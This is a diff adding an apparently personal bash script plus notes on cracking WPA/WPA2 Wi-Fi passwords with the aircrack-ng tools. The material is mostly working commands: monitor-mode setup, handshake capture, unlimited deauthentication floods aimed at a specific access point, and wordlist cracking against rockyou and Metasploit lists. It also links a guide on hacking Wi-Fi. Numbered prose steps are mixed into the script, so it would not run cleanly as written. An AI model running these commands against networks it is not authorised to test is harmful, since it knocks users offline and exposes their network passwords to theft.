@@ -1,0 +1,115 @@
+#!/bin/bash
+
+clear
+sudo ifconfig
+echo "-------------------------"
+sudo iwconfig
+echo "-------------------------"
+sudo /usr/sbin/airmon-ng 
+
+port="wlp1s0"
+monport="wlp1s0mon"
+
+echo "[1]:airmon-ng check kill"
+sudo airmon-ng check kill
+
+echo "[2]: airmon-ng start $port"
+sudo airmon-ng start $port # Start monitoring $port
+sudo /usr/sbin/airmon-ng 
+
+echo "[3]: sudo airodump-ng $monport -w handshakes -b abg"
+  
+sudo airodump-ng $monport -w handshakes -b abg
+
+
+
+5.2 Another way 
+    
+    besside-ng -W -c 6 -b 00:00:11:22:33:44 wlp1s0mon
+    with this method there  is no need to do stage 6.
+
+6.  Open a new terminal window to disconnect the clients connected 
+    to the target network.  
+  sudo aireplay-ng -0 0 -a 3C:7C:3F:B5:F3:A0 wlp1s0mon
+     
+     aireplay-ng : To inject frames
+    -0 : For deauthentication
+    10 : No. of deauthentication packets to be sent
+         (0 would mean infinite)
+           
+    -a : For the bssid of the target network
+    wlp1s0mon : Name of the interface.
+ 
+  When the client is disconnected from the target network. 
+  He tries to reconnect to the network and when ie does you will
+   get something called WPA handshake in the previous window of
+    the terminal. 
+    something like
+   CH 11 ][ Elapsed: 8 mins ][ 2025-11-08 10:32 ][ WPA handshake: 6E:1C:CA:A3:1A:77 
+ 
+ 
+ 7. To decrypt the password.   
+ 
+ sudo aircrack-ng -a2 -b 3C:7C:3F:B5:F3:A0 -w /usr/share/wordlists/rockyou.txt ./-01.cap
+ 
+ aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
+-a : -a2 for WPA2 & -a for WPA network
+-b : The BSSID of the target network
+-w : Location of the wordlist file
+-01.cap : cap file
+ 
+ 
+ 
+ passward lists
+  /usr/share/wordlists/rockyou.txt
+  /usr/share/wordlists/wifite.txt
+  /usr/share/metasploit-framework/data/wordlists/sid.txt
+  /usr/share/metasploit-framework/data/wordlists/common_roots.txt 
+   
+https://www.geeksforgeeks.org/linux-unix/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
+ 
+
+Restart stopped services to reactivate your network connection
+sudo airmon-ng stop wlp1s0mon
+ 
+
+Run sudo /usr/sbin/airmon-ng without any arguments to see available interface
+
+PHY	Interface	          Driver		Chipset
+
+phy0	wlp1s0		       iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
+phy3	wlxe894f6236dc9	   rt2800usb	Ralink Technology, Corp. RT2870/RT3070
+
+
+--------------------   Monitor Mode  ----------------------
+       
+PHY	Interface	Driver		Chipset
+
+phy1	wlan0mon	rt2800usb	Ralink Technology, Corp. RT2870/RT3070
+phy0	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
+
+-----------------------------------------------------
+$ sudo systemctl start wpa_supplicant.service
+$ sudo systemctl start NetworkManager.service
+
+
+sudo airodump-ng wlp1s0mon -w handshakes -b abg
+-b abg # capturing on both the 2.4 GHz and 5 GHz bands
+-w file name # save to a packet capture
+
+                  
+----------------------------- “hidden” network  -----
+sudo airodump-ng wlp1s0mon -w handshakes -c 1 -t WPA -d 00:11:22:33:44:27
+-c 1 #channel 1 
+-t WPA# set it to WPA
+-d 00:11:22:33:44:27 #filter on the BSSID, 00:11:22:33:44:27  
+
+---------------------   Restart  network connection---------------------
+ 
+
+ 
+
+Run sudo /usr/sbin/airmon-ng without any arguments to see available interface
+sudo airmon-ng stop wlp1s0mon
+sudo systemctl start NetworkManager
+
